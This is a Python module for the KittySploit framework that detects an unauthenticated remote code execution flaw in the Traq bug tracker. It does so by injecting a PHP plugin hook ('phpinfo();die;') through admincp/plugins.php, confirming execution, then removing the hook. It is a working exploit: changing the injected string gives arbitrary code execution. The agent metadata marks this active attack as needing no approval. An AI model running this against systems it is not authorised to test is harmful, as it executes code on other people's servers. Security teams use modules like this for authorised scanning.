#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects Traq RCE by POSTing a phpinfo plugin hook to admincp/plugins."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Traq - Unauthenticated Plugin Hook RCE Detection',
        'description': (
            'Detects Traq RCE by POSTing a phpinfo plugin hook to admincp/plugins.php?newhook then GETting index.php and matching phpinfo.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'traq', 'rce', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.securityfocus.com/bid/50961',
        ],
    }

    def run(self):
        for base in ('/traq', '/phptraq', '/bugtracker', ''):
            idx = f'{base}/index.php' if base else '/index.php'
            probe = self.http_request(method='GET', path=idx, allow_redirects=False)
            if not probe or 'Powered by Traq' not in (probe.text or ''):
                continue
            hook = f'{base}/admincp/plugins.php?newhook' if base else '/admincp/plugins.php?newhook'
            self.http_request(
                method='POST', path=hook,
                data='plugin_id=12323&title=1&execorder=0&hook=template_footer&code=phpinfo();die;',
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=False,
            )
            r = self.http_request(method='GET', path=idx, allow_redirects=False)
            if r and '<title>phpinfo()' in (r.text or ''):
                rem = f'{base}/admincp/plugins.php?remove&plugin=12323' if base else '/admincp/plugins.php?remove&plugin=12323'
                self.http_request(method='GET', path=rem, allow_redirects=False)
                self.set_info(severity='critical', reason='Traq unauthenticated plugin hook RCE', path=hook.split('?')[0])
                return True
        return False

